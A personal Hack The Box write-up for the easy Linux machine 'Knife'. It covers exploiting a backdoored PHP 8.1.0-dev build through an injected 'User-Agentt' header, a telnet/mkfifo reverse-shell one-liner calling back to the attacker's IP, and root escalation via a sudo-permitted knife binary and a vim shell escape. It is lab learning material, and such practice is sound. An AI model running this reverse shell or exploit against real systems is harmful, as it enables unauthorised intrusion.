---
Started: 11-07-25 | 09:04
Ended: 11-07-25 | 11:22
---

#CTF/HTB/Linux/Easy

# Given

Knife is an easy difficulty Linux machine that features an application which is running on a backdoored version of PHP. This vulnerability is leveraged to obtain the foothold on the server. A sudo misconfiguration is then exploited to gain a root shell.

## IP

10.10.10.242

# Writeup

## Enumeration

I started with running Rustscan really quick to see what ports were open. I also had a full Nmap scan running in the background. I got two open ports:

- SSH(22)
- HTTP(80)

I started looking at port 80. It seemed to be a Linux based web server running `Apache/2.4.41 (Ubuntu)`. There's a website on it called `Emergent Medical Idea`.
There weren't any creds left behind in the source code, nor were there any working links. I started looking at the tech stack before going ahead with any sort of directory busting.

![](Assets/Pasted%20image%2020250711095943.png)
Aside from the version of Apache and what type of server this was, I got the technology the site was based on and version:

- PHP 8.1.0-dev

## Exploit

I ran this through `searchsploit` and got a hit on a Remote Code Execution vulnerability.

![](Assets/Pasted%20image%2020250711100152.png)
** Check out the details of the vulnerability on [exploitdb](https://www.exploit-db.com/exploits/49933)

## Foothold

Reading through the python script, it seemed use an additional request header called `User Agentt` to inject commands to the web server.
![](Assets/Pasted%20image%2020250711113836.png)

![](Assets/Pasted%20image%2020250711102856.png)

This isn't a proper shell though, so I had to create a reverse shell to my machine. I used [revshells](www.revshells.com) to generate a telnet based script and have it connect to my netcat listener.

```shell
TF=$(mktemp -u);mkfifo $TF && telnet 10.10.16.2 4443 0<$TF | sh 1>$TF
```

This got me a basic shell onto the web server. I then had to upgrade it.

The user flag is in james's home directory

![](Assets/Pasted%20image%2020250711103147.png)

## Privilege Escalation

Now that I was in the web server as `james` I needed to escalate my privileges to get to `root`. I started with checking james's permissions on the server with `sudo -l`. This shows that james can run a script as root

![](Assets/Pasted%20image%2020250711103220.png)

I tried to add code to the file `knife`, and tried to replace it. Those didnt really work. So I had to google what knife was (and I tried hard to not look at writeups). I looked through gtfobins, found knife, and a simple way to escalate my privileges on this machine.

![](Assets/Pasted%20image%2020250711111918.png)

This got my shell upgraded to root, and I proceeded to get the flag in the home directory.

![](Assets/Pasted%20image%2020250711112110.png)

# Extra Notes

What if GTFO bins didn't have a privesc for Knife?

I first would need to know what knife is in the first place. Googling this got me [here](https://docs.chef.io/workstation/knife_setup/). TLDR: Knife is a command line utility that was created to communicate with Chef, which is a basically an automation platform.

## VIM Escape

The `knife data bag` subcommand allows users to interact with global variables as JSON objects.

I looked through the knife docs, and tried to create a bag, which I could hopefully edit with vim later. That didn't really work. 

![](Assets/Pasted%20image%2020250711120321.png)

So I tried to get the same command into vim like 0xdf does in his walkthrough, that didn't work either despite me restarting the server. 

Ideally, we should be able to edit the file on vim, and then run commands through vim's command line by running

```shell
!/bin/bash
```

# References

[0xdf - knife](https://0xdf.gitlab.io/2021/08/28/htb-knife.html#shell-as-root)